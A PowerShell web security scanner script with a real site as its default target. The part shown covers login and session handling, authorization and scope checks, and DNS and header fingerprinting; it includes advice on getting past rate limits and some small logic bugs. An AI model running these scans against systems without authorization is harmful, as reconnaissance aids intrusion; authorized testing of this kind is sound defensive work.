# ============================================================================
# ADVANCED SECURITY TESTING SUITE v2.0 (Enhanced & Production-Ready)
# ============================================================================
# LEGAL WARNING:
# - Only run against systems you own or have written authorization to test
# - Unauthorized security testing may be illegal in your jurisdiction
# - The authors assume no liability for misuse of this tool
# ============================================================================

param(
    [Parameter(Mandatory=$false)]
    [string]$site = "https://canifly.it",
    
    # renamed from $verbose to avoid conflict with PowerShell's built-in -Verbose common parameter
    [Parameter(Mandatory=$false)]
    [switch]$dverbose = $false,
    
    [Parameter(Mandatory=$false)]
    [switch]$quick = $false,
    
    [Parameter(Mandatory=$false)]
    [switch]$skipSlow = $false,
    
    [Parameter(Mandatory=$false)]
    [string]$outputDir = ".",
    
    [Parameter(Mandatory=$false)]
    [int]$timeout = 10,
    
    [Parameter(Mandatory=$false)]
    [string]$userAgent = "SecurityScanner/2.0 (Authorized Testing)",
    
    [Parameter(Mandatory=$false)]
    [switch]$htmlReport = $false,
    
    [Parameter(Mandatory=$false)]
    [switch]$noColor = $false,
    
    # NEW PROFESSIONAL PARAMETERS
    [Parameter(Mandatory=$false)]
    [string]$ConfirmAuthorization = "",
    
    [Parameter(Mandatory=$false)]
    [ValidateSet("Passive", "Aggressive")]
    [string]$Mode = "Passive",
    
    [Parameter(Mandatory=$false)]
    [int]$MaxRequests = 1000,
    
    [Parameter(Mandatory=$false)]
    [switch]$ForceExternal = $false,
    
    [Parameter(Mandatory=$false)]
    [string]$BaselineReport = "",
    
    # AUTHENTICATED TESTING PARAMETERS
    [Parameter(Mandatory=$false)]
    [string]$Username = "",
    
    [Parameter(Mandatory=$false)]
    [string]$Password = "",
    
    [Parameter(Mandatory=$false)]
    [string]$LoginUrl = "",
    
    [Parameter(Mandatory=$false)]
    [string]$LoginEndpoint = "/login",
    
    [Parameter(Mandatory=$false)]
    [string]$TestUser = "test@example.com",
    
    [Parameter(Mandatory=$false)]
    [Alias("AuthCookie")]
    [string]$SessionCookie = "",
    
    [Parameter(Mandatory=$false)]
    [string]$AuthUserId = "",
    
    [Parameter(Mandatory=$false)]
    [hashtable]$AuthHeaders = @{}
)

# ----------------------------------------------------------------------------
# CONFIGURATION & GLOBALS
# ----------------------------------------------------------------------------
$ErrorActionPreference = "SilentlyContinue"
$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
$scanId = [guid]::NewGuid().ToString().Substring(0,8)

# Output files
$logFile        = Join-Path $outputDir "security_scan_${timestamp}_${scanId}.log"
$jsonReport     = Join-Path $outputDir "security_scan_${timestamp}_${scanId}.json"
$htmlReportPath = Join-Path $outputDir "security_scan_${timestamp}_${scanId}.html"
$csvReport      = Join-Path $outputDir "security_scan_${timestamp}_${scanId}.csv"

# Issue tracking with enhanced metadata
$script:issues = @{
    Critical = @()
    High     = @()
    Medium   = @()
    Low      = @()
    Info     = @()
}

# CWE/OWASP Mapping Database
$script:cweMappings = @{
    "XSS"                      = @{ CWE = "CWE-79"; OWASP = "A03:2021 - Injection" }
    "SQLi"                     = @{ CWE = "CWE-89"; OWASP = "A03:2021 - Injection" }
    "CommandInjection"         = @{ CWE = "CWE-78"; OWASP = "A03:2021 - Injection" }
    "PathTraversal"            = @{ CWE = "CWE-22"; OWASP = "A03:2021 - Injection" }
    "CSRF"                     = @{ CWE = "CWE-352"; OWASP = "A01:2021 - Broken Access Control" }
    "Clickjacking"             = @{ CWE = "CWE-1021"; OWASP = "A01:2021 - Broken Access Control" }
    "OpenRedirect"             = @{ CWE = "CWE-601"; OWASP = "A01:2021 - Broken Access Control" }
    "CORS"                     = @{ CWE = "CWE-942"; OWASP = "A01:2021 - Broken Access Control" }
    "InfoDisclosure"           = @{ CWE = "CWE-200"; OWASP = "A02:2021 - Cryptographic Failures" }
    "WeakSession"              = @{ CWE = "CWE-384"; OWASP = "A07:2021 - Identification and Authentication Failures" }
    "BruteForce"               = @{ CWE = "CWE-307"; OWASP = "A07:2021 - Identification and Authentication Failures" }
    "SensitiveDataExposure"    = @{ CWE = "CWE-200"; OWASP = "A02:2021 - Cryptographic Failures" }
    "SecurityMisconfiguration" = @{ CWE = "CWE-16"; OWASP = "A05:2021 - Security Misconfiguration" }
    "CachePoisoning"           = @{ CWE = "CWE-444"; OWASP = "A05:2021 - Security Misconfiguration" }
    "HPP"                      = @{ CWE = "CWE-235"; OWASP = "A03:2021 - Injection" }
    "DoS"                      = @{ CWE = "CWE-400"; OWASP = "A05:2021 - Security Misconfiguration" }
}

$script:testResults = @{}
$script:scanStats = @{
    StartTime     = Get-Date
    EndTime       = $null
    Duration      = $null
    TestsRun      = 0
    TestsPassed   = 0
    TestsFailed   = 0
    RequestsMade  = 0
    BytesReceived = 0
}

# Authentication state management
$script:authState = @{
    IsAuthenticated = $false
    SessionCookies = @{}
    AuthHeaders = @{}
    Username = ""
    LoginTimestamp = $null
    CSRFToken = ""
    CSRFTokenName = ""
}

# ----------------------------------------------------------------------------
# ENHANCED OUTPUT FUNCTIONS
# ----------------------------------------------------------------------------
function Write-ColorOutput {
    param($message, $color = "White", $level = "INFO")
    
    if ($noColor) {
        $prefix = "[$level]"
        Write-Host "$prefix $message"
        return
    }
    
    $colorMap = @{
        "SUCCESS" = "Green"
        "DANGER"  = "Red"
        "WARNING" = "Yellow"
        "INFO"    = "Cyan"
        "DEBUG"   = "Gray"
    }
    
    $fgColor = if ($colorMap.ContainsKey($level)) { $colorMap[$level] } else { $color }
    $prefix = switch ($level) {
        "SUCCESS" { "[OK]" }
        "DANGER"  { "[X]" }
        "WARNING" { "[!]" }
        "INFO"    { "[i]" }
        "DEBUG"   { "[D]" }
        default   { "[$level]" }
    }
    
    Write-Host "$prefix $message" -ForegroundColor $fgColor
}

function Write-Success { param($m) Write-ColorOutput $m -level "SUCCESS" }
function Write-Danger  { param($m) Write-ColorOutput $m -level "DANGER" }
function Write-Warning { param($m) Write-ColorOutput $m -level "WARNING" }
function Write-Info    { param($m) Write-ColorOutput $m -level "INFO" }
function Write-Debug   { param($m) if ($dverbose) { Write-ColorOutput $m -level "DEBUG" } }

function Write-Section {
    param($title, $testNumber = "")
    $separator = "=" * 70
    Write-Host ""
    Write-Host $separator -ForegroundColor Magenta
    if ($testNumber) {
        Write-Host "== TEST $testNumber : $title" -ForegroundColor Magenta
    } else {
        Write-Host "== $title" -ForegroundColor Magenta
    }
    Write-Host $separator -ForegroundColor Magenta
    Write-Host ""
}

function Write-Log {
    param($message, $level = "INFO")
    $timestampNow = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestampNow] [$level] $message"
    $logEntry | Out-File -Append -FilePath $logFile -Encoding UTF8
    if ($dverbose) { Write-Debug $message }
}

function Write-Progress-Custom {
    param($activity, $status, $percentComplete)
    Write-Progress -Activity $activity -Status $status -PercentComplete $percentComplete
}

# ----------------------------------------------------------------------------
# UTILITY: URL encode / decode without System.Web.HttpUtility
# ----------------------------------------------------------------------------
function Encode-Url {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Text
    )
    return [System.Uri]::EscapeDataString($Text)
}

function Decode-Url {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Text
    )
    return [System.Uri]::UnescapeDataString($Text)
}

# ----------------------------------------------------------------------------
# ISSUE MANAGEMENT
# ----------------------------------------------------------------------------
function Add-Issue {
    param(
        [Parameter(Mandatory=$true)]
        [ValidateSet("Critical","High","Medium","Low","Info")]
        [string]$severity,
        
        [Parameter(Mandatory=$true)]
        [string]$title,
        
        [Parameter(Mandatory=$true)]
        [string]$description,
        
        [string]$url = "",
        [string]$remediation = "",
        [string]$cve = "",
        [string]$cvss = "",
        [hashtable]$evidence = @{ },
        
        # Professional security testing metadata
        [string]$cweId = "",
        [string]$owaspCategory = "",
        [ValidateSet("Transport","Session","Authentication","Authorization","Input Validation","Browser Hardening","Information Disclosure","Cryptography","Configuration","Access Control","Business Logic")]
        [string]$category = "",
        [ValidateSet("High","Medium","Low")]
        [string]$confidence = "Medium",
        [string]$issueType = "",
        
        # Executive-level reporting fields
        [string]$whyItMatters = "",
        [string]$suggestedFix = ""
    )

    # Auto-map CWE and OWASP if issueType is provided
    if ($issueType -and $script:cweMappings.ContainsKey($issueType)) {
        if (-not $cweId) { $cweId = $script:cweMappings[$issueType].CWE }
        if (-not $owaspCategory) { $owaspCategory = $script:cweMappings[$issueType].OWASP }
    }
    
    # Use remediation as suggestedFix if suggestedFix not provided
    if (-not $suggestedFix -and $remediation) {
        $suggestedFix = $remediation
    }

    $issue = [PSCustomObject]@{
        Severity       = $severity
        Title          = $title
        Description    = $description
        URL            = $url
        Remediation    = $remediation
        WhyItMatters   = $whyItMatters
        SuggestedFix   = $suggestedFix
        CVE            = $cve
        CVSS           = $cvss
        Evidence       = $evidence
        Timestamp      = Get-Date
        TestNumber     = $script:currentTestNumber
        CWE            = $cweId
        OWASPCategory  = $owaspCategory
        Category       = $category
        Confidence     = $confidence
        IssueType      = $issueType
    }

    $script:issues[$severity] += $issue
    Write-Log "[$severity] $title - $description" $severity.ToUpper()
    
    switch ($severity) {
        "Critical" { Write-Danger "CRITICAL: $title" }
        "High"     { Write-Danger "HIGH: $title" }
        "Medium"   { Write-Warning "MEDIUM: $title" }
        "Low"      { Write-Warning "LOW: $title" }
        "Info"     { Write-Info "INFO: $title" }
    }
}

# ----------------------------------------------------------------------------
# HTTP REQUEST WRAPPER WITH AUTHENTICATION SUPPORT
# ----------------------------------------------------------------------------
function Invoke-SafeWebRequest {
    param(
        [string]$uri,
        [string]$method = "GET",
        [hashtable]$headers,
        [int]$timeoutSec = $timeout,
        [bool]$allowRedirect = $true,
        [string]$body = $null,
        [bool]$returnRaw = $false,
        [bool]$useAuth = $true
    )
    
    # Initialize headers if not provided
    if (-not $headers) {
        $headers = @{}
    }
    
    $script:scanStats.RequestsMade++
    
    try {
        # Merge authentication headers if authenticated
        if ($useAuth -and $script:authState.IsAuthenticated) {
            foreach ($key in $script:authState.AuthHeaders.Keys) {
                if (-not $headers.ContainsKey($key)) {
                    $headers[$key] = $script:authState.AuthHeaders[$key]
                }
            }
        }
        
        $params = @{
            Uri         = $uri
            Method      = $method
            Headers     = $headers
            TimeoutSec  = $timeoutSec
            UserAgent   = $userAgent
            ErrorAction = 'Stop'
        }
        
        # Add session cookies if authenticated
        if ($useAuth -and $script:authState.IsAuthenticated -and $script:authState.SessionCookies.Count -gt 0) {
            $cookieContainer = New-Object System.Net.CookieContainer
            $uriObj = [System.Uri]$uri
            
            foreach ($cookieName in $script:authState.SessionCookies.Keys) {
                $cookie = New-Object System.Net.Cookie
                $cookie.Name = $cookieName
                $cookie.Value = $script:authState.SessionCookies[$cookieName]
                $cookie.Domain = $uriObj.Host
                $cookieContainer.Add($cookie)
            }
            
            $params.WebSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession
            $params.WebSession.Cookies = $cookieContainer
        }
        
        if (-not $allowRedirect) {
            $params.MaximumRedirection = 0
        }
        
        if ($body) {
            $params.Body = $body
        }
        
        $response = Invoke-WebRequest @params
        $script:scanStats.BytesReceived += $response.Content.Length
        
        if ($returnRaw) {
            return $response
        }
        
        return @{
            Success     = $true
            StatusCode  = $response.StatusCode
            Headers     = $response.Headers
            Content     = $response.Content
            Response    = $response
        }
    }
    catch {
        $statusCode = $null
        if ($_.Exception.Response) {
            $statusCode = [int]$_.Exception.Response.StatusCode
        }
        
        return @{
            Success    = $false
            StatusCode = $statusCode
            Error      = $_.Exception.Message
            Exception  = $_
        }
    }
}

# ============================================================================
# AUTHENTICATION & SESSION MANAGEMENT
# ============================================================================

function Initialize-Authentication {
    <#
    .SYNOPSIS
    Initializes authenticated session for scanning while logged in
    #>
    
    Write-Info "Checking authentication configuration..."
    
    # Method 1: Direct session cookie provided
    if ($SessionCookie) {
        Write-Info "Using provided session cookie for authentication"
        
        # Parse cookie string (format: "name=value" or "name1=value1; name2=value2")
        $cookiePairs = $SessionCookie -split ';'
        foreach ($pair in $cookiePairs) {
            $parts = $pair.Trim() -split '=', 2
            if ($parts.Count -eq 2) {
                $script:authState.SessionCookies[$parts[0].Trim()] = $parts[1].Trim()
            }
        }
        
        $script:authState.IsAuthenticated = $true
        Write-Success "Session cookie configured"
        return $true
    }
    
    # Method 2: Username/Password login
    if ($Username -and $Password) {
        if (-not $LoginUrl) {
            $LoginUrl = "$site/login"
        }
        
        Write-Info "Attempting form-based authentication to: $LoginUrl"
        
        try {
            # First, get the login page to extract CSRF token
            $loginPageResult = Invoke-SafeWebRequest -uri $LoginUrl -method "GET" -useAuth $false
            
            if ($loginPageResult.Success) {
                $loginHtml = $loginPageResult.Content
                
                # Try to detect CSRF token
                $csrfToken = ""
                $csrfTokenName = ""
                
                $tokenPatterns = @{
                    '_csrf' = '<input[^>]*name=["' + "'" + ']_csrf["' + "'" + '][^>]*value=["' + "'" + '](.*?)["' + "'" + ']'
                    'csrf_token' = '<input[^>]*name=["' + "'" + ']csrf_token["' + "'" + '][^>]*value=["' + "'" + '](.*?)["' + "'" + ']'
                    'csrfmiddlewaretoken' = '<input[^>]*name=["' + "'" + ']csrfmiddlewaretoken["' + "'" + '][^>]*value=["' + "'" + '](.*?)["' + "'" + ']'
                    '__RequestVerificationToken' = '<input[^>]*name=["' + "'" + ']__RequestVerificationToken["' + "'" + '][^>]*value=["' + "'" + '](.*?)["' + "'" + ']'
                    'authenticity_token' = '<input[^>]*name=["' + "'" + ']authenticity_token["' + "'" + '][^>]*value=["' + "'" + '](.*?)["' + "'" + ']'
                }
                
                foreach ($tokenName in $tokenPatterns.Keys) {
                    if ($loginHtml -match $tokenPatterns[$tokenName]) {
                        $csrfToken = $Matches[1]
                        $csrfTokenName = $tokenName
                        Write-Info ("Detected CSRF token: " + $csrfTokenName)
                        break
                    }
                }
                
                # Build login payload
                $loginData = @{
                    username = $Username
                    password = $Password
                }
                
                # Add CSRF token if found
                if ($csrfToken) {
                    $loginData[$csrfTokenName] = $csrfToken
                    $script:authState.CSRFToken = $csrfToken
                    $script:authState.CSRFTokenName = $csrfTokenName
                }
                
                # Convert to form-encoded string
                $formBody = ($loginData.GetEnumerator() | ForEach-Object { 
                    "$([System.Uri]::EscapeDataString($_.Key))=$([System.Uri]::EscapeDataString($_.Value))" 
                }) -join '&'
                
                # Attempt login
                $loginHeaders = @{
                    'Content-Type' = 'application/x-www-form-urlencoded'
                }
                
                $loginResult = Invoke-SafeWebRequest -uri $LoginUrl -method "POST" -body $formBody -headers $loginHeaders -useAuth $false
                
                if ($loginResult.Success -or $loginResult.StatusCode -in @(302, 303)) {
                    # Extract session cookies from response
                    if ($loginResult.Response.Headers['Set-Cookie']) {
                        $cookies = $loginResult.Response.Headers['Set-Cookie']
                        foreach ($cookie in $cookies) {
                            $cookieParts = $cookie -split ';'
                            $mainPart = $cookieParts[0] -split '=', 2
                            if ($mainPart.Count -eq 2) {
                                $script:authState.SessionCookies[$mainPart[0].Trim()] = $mainPart[1].Trim()
                            }
                        }
                    }
                    
                    $script:authState.IsAuthenticated = $true
                    $script:authState.Username = $Username
                    $script:authState.LoginTimestamp = Get-Date
                    
                    Write-Success "Successfully authenticated as: $Username"
                    Write-Info "Session cookies captured: $($script:authState.SessionCookies.Keys -join ', ')"
                    return $true
                }
                else {
                    Write-Warning "Login failed with status: $($loginResult.StatusCode)"
                    Write-Warning "Login may have failed - continuing unauthenticated"
                    return $false
                }
            }
        }
        catch {
            Write-Warning "Authentication failed: $_"
            return $false
        }
    }
    
    # Method 3: Custom auth headers
    if ($AuthHeaders.Count -gt 0) {
        Write-Info "Using custom authentication headers"
        $script:authState.AuthHeaders = $AuthHeaders
        $script:authState.IsAuthenticated = $true
        Write-Success "Custom auth headers configured"
        return $true
    }
    
    # No authentication configured
    Write-Info "No authentication credentials provided - running unauthenticated scan"
    return $false
}

function Test-AuthenticationStatus {
    <#
    .SYNOPSIS
    Verifies that authentication is still valid
    #>
    
    if (-not $script:authState.IsAuthenticated) {
        return $false
    }
    
    try {
        # Try to access a page that should require authentication
        # Use the site root or a common authenticated endpoint
        $testUrl = "$site/account"
        $result = Invoke-SafeWebRequest -uri $testUrl -method "GET" -useAuth $true
        
        # If we get 401/403, session expired
        if ($result.StatusCode -in @(401, 403)) {
            Write-Warning "Authentication session appears to have expired"
            $script:authState.IsAuthenticated = $false
            return $false
        }
        
        return $true
    }
    catch {
        return $true  # Assume OK if can't verify
    }
}

# ----------------------------------------------------------------------------
# ENHANCED TEST TRACKING
# ----------------------------------------------------------------------------
function Start-SecurityTest {
    param($testName, $testNumber)
    $script:currentTestNumber = $testNumber
    $script:currentTestName = $testName
    $script:testResults[$testName] = @{
        Number      = $testNumber
        StartTime   = Get-Date
        Status      = "Running"
        IssuesFound = 0
    }
    $script:scanStats.TestsRun++
    Write-Section $testName $testNumber
}

function Complete-SecurityTest {
    param([string]$status = "Completed")
    
    $test = $script:testResults[$script:currentTestName]
    $test.EndTime   = Get-Date
    $test.Duration  = ($test.EndTime - $test.StartTime).TotalSeconds
    $test.Status    = $status
    
    if ($status -eq "Completed") {
        $script:scanStats.TestsPassed++
    } else {
        $script:scanStats.TestsFailed++
    }
}

# ============================================================================
# GRACEFUL TEST EXECUTION WRAPPER
# ============================================================================
function Invoke-TestWithFallback {
    <#
    .SYNOPSIS
    Executes security test with graceful error handling
    .DESCRIPTION
    Wraps test execution in try-catch to prevent single test failures from aborting entire scan
    #>
    param(
        [scriptblock]$TestFunction,
        [string]$TestName
    )
    
    try {
        & $TestFunction
    }
    catch {
        $errorDetails = @{
            Message = $_.Exception.Message
            Type = $_.Exception.GetType().FullName
            Line = $_.InvocationInfo.ScriptLineNumber
            Position = $_.InvocationInfo.PositionMessage
            StackTrace = $_.ScriptStackTrace
        }
        
        Write-Danger "═══════════════════════════════════════════════════════"
        Write-Danger "  TEST FAILED: $TestName"
        Write-Danger "═══════════════════════════════════════════════════════"
        Write-Danger "Error: $($errorDetails.Message)"
        Write-Warning "Type: $($errorDetails.Type)"
        if ($errorDetails.Line) {
            Write-Info "Location: Line $($errorDetails.Line)"
        }
        Write-Danger "═══════════════════════════════════════════════════════"
        
        Write-Log "Test $TestName failed with error: $($errorDetails.Message)" "ERROR"
        Write-Log "Error Type: $($errorDetails.Type)" "ERROR"
        Write-Log "Stack trace: $($errorDetails.StackTrace)" "DEBUG"
        
        # Log as test issue with full context
        Add-Issue -severity "Info" `
            -title "Test Execution Error: $TestName" `
            -description "This test encountered an unhandled exception and could not complete. Error: $($errorDetails.Message)" `
            -remediation "Review test implementation or target site configuration. Check scan logs for full stack trace." `
            -whyItMatters "Test failures may indicate: 1) Scanner bugs, 2) Unexpected target behavior, 3) Network issues, 4) Edge cases not handled. This is a scanner reliability issue, not necessarily a target vulnerability." `
            -suggestedFix "1. Check scan logs for full error details. 2. Verify target site is accessible and stable. 3. Re-run scan to confirm if error is transient. 4. Report persistent errors to scanner maintainer." `
            -category "Configuration" `
            -issueType "TestExecutionError" `
            -confidence "High" `
            -evidence $errorDetails
        
        # Mark test as failed but continue
        if ($script:currentTestName) {
            Complete-SecurityTest -status "Failed"
        }
        
        Write-Warning "Continuing with remaining tests..."
        Write-Host ""
    }
}

# ============================================================================
# TEST 0: PRE-SCAN SAFETY & SCOPE VALIDATION
# ============================================================================
function Test-ScopeAndSafety {
    Start-SecurityTest "Scope and Safety Validation" "0"
    
    $result = @{
        Name = "ScopeAndSafety"
        Status = "Failed"
        Duration = 0
        Issues = @()
        Evidence = @{}
        Metrics = @{
            ScopeValidated = $false
            Mode = $Mode
            MaxRequests = $MaxRequests
            TesterIdentity = $env:USERNAME
            Timestamp = Get-Date
            TargetDomain = ""
        }
    }
    
    try {
        # Extract domain from site URL
        $uri = [System.Uri]$site
        $targetDomain = $uri.Host
        $result.Metrics.TargetDomain = $targetDomain
        
        Write-Info "Target Domain: $targetDomain"
        Write-Info "Mode: $Mode"
        Write-Info "Max Requests: $MaxRequests"
        Write-Info "Tester: $($env:USERNAME)"
        
        # CRITICAL: Authorization confirmation check
        if ([string]::IsNullOrWhiteSpace($ConfirmAuthorization)) {
            Write-Danger "ABORT: No authorization confirmation provided!"
            Write-Warning "You MUST provide -ConfirmAuthorization 'I am authorized to test $targetDomain'"
            
            Add-Issue -severity "Critical" `
                -title "Authorization Not Confirmed" `
                -description "No explicit authorization confirmation was provided. Security testing without authorization may be illegal." `
                -remediation "Provide -ConfirmAuthorization parameter with explicit confirmation." `
                -issueType "SecurityMisconfiguration" `
                -confidence "High"
            
            $result.Status = "Aborted"
            return $result
        }
        
        # Validate authorization matches target
        if ($ConfirmAuthorization -notmatch [regex]::Escape($targetDomain)) {
            Write-Danger "ABORT: Authorization confirmation does not match target domain!"
            Write-Warning "Confirmation: '$ConfirmAuthorization'"
            Write-Warning "Target: '$targetDomain'"
            
            Add-Issue -severity "Critical" `
                -title "Authorization Mismatch" `
                -description "The authorization confirmation does not match the target domain being tested." `
                -remediation "Ensure authorization confirmation explicitly mentions '$targetDomain'." `
                -issueType "SecurityMisconfiguration" `
                -confidence "High"
            
            $result.Status = "Aborted"
            return $result
        }
        
        # Check for dangerous wildcard targets in Aggressive mode
        if ($Mode -eq "Aggressive" -and -not $ForceExternal) {
            $dangerousPatterns = @('*.gov', '*.mil', '*.edu', '*.bank', '*.com', '*.org', '*.net')
            foreach ($pattern in $dangerousPatterns) {
                if ($targetDomain -like $pattern -or $targetDomain -match '\*') {
                    Write-Danger "ABORT: Wildcard/broad target detected in Aggressive mode without -ForceExternal!"
                    Write-Warning "Target: '$targetDomain'"
                    
                    Add-Issue -severity "Critical" `
                        -title "Unsafe Target Scope" `
                        -description "Wildcard or extremely broad target detected in Aggressive mode. This could affect unintended systems." `
                        -remediation "Use specific domain names or add -ForceExternal if you're certain." `
                        -issueType "SecurityMisconfiguration" `
                        -confidence "High"
                    
                    $result.Status = "Aborted"
                    return $result
                }
            }
        }
        
        # Warn about aggressive mode
        if ($Mode -eq "Aggressive") {
            Write-Warning "AGGRESSIVE MODE ENABLED - Higher request volume and more intrusive tests will run"
            Write-Warning "Ensure target system can handle increased load"
            Start-Sleep -Seconds 2
        }
        
        # Check request budget
        if ($MaxRequests -lt 100) {
            Write-Warning "MaxRequests is very low ($MaxRequests). Some tests may be skipped."
        }
        
        # All checks passed
        Write-Success "Scope validation PASSED"
        Write-Success "Authorization confirmed for: $targetDomain"
        Write-Success "Mode: $Mode | Max Requests: $MaxRequests"
        
        $result.Metrics.ScopeValidated = $true
        $result.Status = "Completed"
        
        Add-Issue -severity "Info" `
            -title "Scope Validation Successful" `
            -description "Pre-scan safety checks passed. Target: $targetDomain, Mode: $Mode, MaxRequests: $MaxRequests, Tester: $($env:USERNAME)" `
            -remediation "N/A - Informational" `
            -confidence "High"
        
    }
    catch {
        Write-Danger "Error during scope validation: $_"
        $result.Status = "Failed"
        $result.Issues += $_
    }
    
    Complete-SecurityTest $result.Status
    return $result
}

# ----------------------------------------------------------------------------
# BANNER & INITIALIZATION
# ----------------------------------------------------------------------------
function Show-Banner {
    $banner = @"

   ╔═══════════════════════════════════════════════════════════════╗
   ║                                                               ║
   ║        ADVANCED SECURITY TESTING SUITE v2.0                   ║
   ║        Comprehensive Web Application Security Scanner         ║
   ║                                                               ║
   ╚═══════════════════════════════════════════════════════════════╝

"@
    Write-Host $banner -ForegroundColor Cyan
}

function Initialize-Scan {
    Show-Banner
    
    Write-Info "Initializing security scan..."
    Write-Info "Target: $site"
    Write-Info "Scan ID: $scanId"
    Write-Info "Output Directory: $outputDir"
    Write-Info "Quick Mode: $quick"
    Write-Info "Skip Slow Tests: $skipSlow"
    Write-Host ""
    
    if (-not (Test-Path $outputDir)) {
        New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
    }
    
    Write-Log "==================================================================="
    Write-Log "SECURITY SCAN INITIALIZED"
    Write-Log "Target: $site"
    Write-Log "Scan ID: $scanId"
    Write-Log "Timestamp: $(Get-Date)"
    Write-Log "User: $env:USERNAME@$env:COMPUTERNAME"
    Write-Log "==================================================================="
    
    try {
        $uri = [System.Uri]$site
        if ($uri.Scheme -notin @("http", "https")) {
            throw "Invalid URL scheme. Must be http or https"
        }
    }
    catch {
        Write-Danger "Invalid target URL: $_"
        exit 1
    }
}

# ============================================================================
# TEST 1: APPLICATION DISCOVERY & FINGERPRINTING
# ============================================================================
function Test-AppDiscovery {
    Start-SecurityTest "Application Discovery and Fingerprinting" "01"
    
    $result = @{
        Name = "AppDiscovery"
        Status = "Completed"
        Duration = 0
        Issues = @()
        Evidence = @{}
        Metrics = @{
            StackComponents = @()
            ServerInfo = @{}
            DNSInfo = @{}
            CloudProvider = "Unknown"
        }
    }
    
    try {
        # ========== DNS & HOSTING INFO ==========
        Write-Info "Phase 1: DNS & Hosting Analysis..."
        
        try {
            $uri = [System.Uri]$site
            $hostname = $uri.Host
            
            # Resolve A/AAAA records
            $dnsEntries = [System.Net.Dns]::GetHostAddresses($hostname)
            $ipList = $dnsEntries | ForEach-Object { $_.IPAddressToString }
            
            Write-Info "Resolved IP addresses: $($ipList -join ', ')"
            $result.Metrics.DNSInfo = @{
                Hostname = $hostname
                IPs = $ipList
                IPCount = $ipList.Count
                HasIPv6 = ($dnsEntries | Where-Object { $_.AddressFamily -eq 'InterNetworkV6' }).Count -gt 0
            }
            
            if ($ipList.Count -gt 1) {
                Write-Info "Multiple IPs detected - likely using load balancer or CDN"
                $result.Metrics.DNSInfo.LoadBalancerHint = $true
            }
            
            # Cloud provider detection (heuristic based on IP ranges and hostnames)
            $cloudHints = @()
            foreach ($ip in $ipList) {
                # AWS ranges: check for common AWS patterns
                if ($ip -match '^(54\.|52\.|3\.)' -or $hostname -match 'amazonaws|aws') {
                    $cloudHints += "AWS"
                }
                # Azure ranges
                if ($ip -match '^(13\.|20\.|40\.|52\.|104\.)' -or $hostname -match 'azure|microsoft') {
                    $cloudHints += "Azure"
                }
                # GCP ranges
                if ($ip -match '^(34\.|35\.)' -or $hostname -match 'googleapis|google') {
                    $cloudHints += "GCP"
                }
                # Cloudflare
                if ($ip -match '^(104\.1[6-9]\.|104\.2[0-9]\.|104\.3[0-1]\.|172\.64\.|172\.65\.|172\.66\.|172\.67\.)' -or $hostname -match 'cloudflare') {
                    $cloudHints += "Cloudflare"
                }
            }
            
            if ($cloudHints.Count -gt 0) {
                $provider = $cloudHints | Select-Object -Unique -First 1
                $result.Metrics.CloudProvider = $provider
                Write-Info "Detected cloud provider: $provider"
                
                Add-Issue -severity "Info" `
                    -title "Cloud Provider Detected: $provider" `
                    -description "Application appears to be hosted on $provider infrastructure" `
                    -remediation "N/A - Informational" `
                    -issueType "InfoDisclosure" `
                    -confidence "Medium"
            }
        }
        catch {
            Write-Warning "DNS analysis failed: $_"
        }
        
        # ========== HTTP BANNER & STACK FINGERPRINT ==========
        Write-Info "Phase 2: HTTP Banner & Stack Fingerprinting..."
        
        $httpResult = Invoke-SafeWebRequest -uri $site -method "GET"
        
        if (-not $httpResult.Success) {
            $errorMsg = $httpResult.Error
            $isRateLimited = $errorMsg -match '429' -or $errorMsg -match 'Too Many Requests' -or $errorMsg -match 'rate.?limit'
            
            if ($isRateLimited) {
                Write-Danger "Target enforced rate limiting: $errorMsg"
                Add-Issue -severity "Critical" `
                    -title "Target Enforcing Aggressive Rate Limiting" `
                    -description "HTTP 429 (Too Many Requests) received during initial connection. Target has aggressive WAF/rate limiting that prevents security assessment. Error: $errorMsg" `
                    -remediation "Re-run tests with: 1) Lower request volume (-Quick flag), 2) Authenticated session (-SessionCookie) to bypass guest rate limits, 3) Longer delays between tests, 4) Whitelist scanner IP with site administrator" `
                    -whyItMatters "Rate limiting prevents comprehensive security assessment. This scanner could not complete fingerprinting or vulnerability detection due to throttling. For production assessments, work with site administrators to whitelist your IP or provide authenticated credentials." `
                    -suggestedFix "Contact site administrator to: (A) Whitelist scanner IP address, (B) Provide test account credentials for authenticated scanning, (C) Temporarily relax rate limits during assessment window" `
                    -category "Operational" `
                    -issueType "RateLimiting" `
                    -confidence "High" `
                    -evidence @{
                        HTTPStatus = "429"
                        ErrorMessage = $errorMsg
                        Recommendation = "Use -SessionCookie with authenticated session"
                    }
            } else {
                Write-Danger "Target unreachable: $errorMsg"
                Add-Issue -severity "Critical" `
                    -title "Target Unreachable" `
                    -description "Cannot establish HTTP connection: $errorMsg" `
                    -remediation "Verify target URL and network connectivity. Check: 1) URL is correct and includes protocol (https://), 2) Target server is online, 3) Firewall allows outbound connections, 4) DNS resolution is working" `
                    -confidence "High"
            }
            
            Complete-SecurityTest "Failed"
            return $result
        }
        
        Write-Success "Target reachable (Status: $($httpResult.StatusCode))"
        
        # Server header analysis
        $server = $httpResult.Headers['Server']
        if ($server) {
            $result.Metrics.ServerInfo.Header = $server
            $result.Metrics.ServerInfo.HasVersionNumber = ($server -match '[\d\.]+')
            
            Write-Warning "Server header exposed: $server"
            Add-Issue -severity "Medium" `
                -title "Server Header Disclosure" `
                -description "Server header reveals technology: $server" `
                -remediation "Remove or obfuscate Server header to prevent targeted attacks" `
                -evidence @{ Header = "Server"; Value = $server } `
                -issueType "InfoDisclosure" `
                -confidence "High"
            
            if ($server -match '[\d\.]+') {
                Write-Warning "Version information leaked in Server header"
                Add-Issue -severity "Medium" `
                    -title "Server Version Disclosure" `
                    -description "Detailed version exposed: $server. This aids attackers in identifying known vulnerabilities." `
                    -remediation "Remove version numbers from Server header" `
                    -issueType "InfoDisclosure" `
                    -confidence "High"
            }
        }
        
        # Technology disclosure headers
        $techHeaders = @{
            'X-Powered-By'            = @{ Severity = 'Medium'; Desc = 'Backend technology' }
            'X-AspNet-Version'        = @{ Severity = 'Medium'; Desc = 'ASP.NET version' }
            'X-AspNetMvc-Version'     = @{ Severity = 'Medium'; Desc = 'ASP.NET MVC version' }
